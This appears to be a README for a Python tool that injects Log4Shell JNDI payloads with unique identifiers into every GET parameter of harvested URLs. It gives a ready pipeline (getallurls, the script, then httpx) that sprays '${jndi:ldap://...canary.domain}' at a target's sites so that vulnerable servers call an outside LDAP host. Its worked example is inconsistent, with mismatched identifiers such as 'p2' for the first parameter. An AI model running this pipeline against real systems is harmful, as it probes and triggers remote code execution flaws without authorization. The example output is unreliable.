# Payload Iterator
Parses known URLs via stdin, filters and populates parameter values with payloads using unique identifiers for better tracking. Similar to and inspired by [Tomnomnom](https://github.com/tomnomnom)'s [qsreplace](https://github.com/tomnomnom/qsreplace). I originally created this as a way to more effectively track sprayed Log4J payloads, but this tool could be used in many different scenarios where unique identifiers are required. 

## Usage
```
usage: payload-iterator.py [-h] -p PAYLOAD [-pr PREFIX] [-o OUTPUT] [--preserve] [-s]

Populates payloads with unique identifiers into URL GET parameters.

optional arguments:
  -h, --help            show this help message and exit
  -p PAYLOAD, --payload PAYLOAD
                        Original payload to manipulate, place <id> in the position you wish to be replaced, it will be replaced with 1 -> n
  -pr PREFIX, --prefix PREFIX
                        Prefix for the payload identifier, e.g. pay<id> will result in pay1 -> pay99999
  -o OUTPUT, --output OUTPUT
                        Output file to write to
  --preserve            Preseve other URL values, limiting to one payload per URL, keeping all other values the same as entered
  -s, --silent          Do not print to stdout
  ```
  
## Example Log4shell use case
```
getallurls -subs $target | python3 payload-iterator.py -o $target-urls.txt --payload '${jndi:ldap://<id>.your.canary.domain/test}' | httpx
```
This will populate all of the parameters in the URLs supplied by `gau` with the payload and iterator. 

E.g. `http://example.com/?param1=blah&param2=blah&param3=blah` -> `http://example.com/?param1=${jndi:ldap://p2.your.canary.domain/test}&param2=${jndi:ldap://p2.your.canary.domain/test}&param3=${jndi:ldap://p3.your.canary.domain/test}`

## To-do / Improvements
None at the moment, if you have any suggestions or improvements to be made feel free to create an issue or submit a PR. 
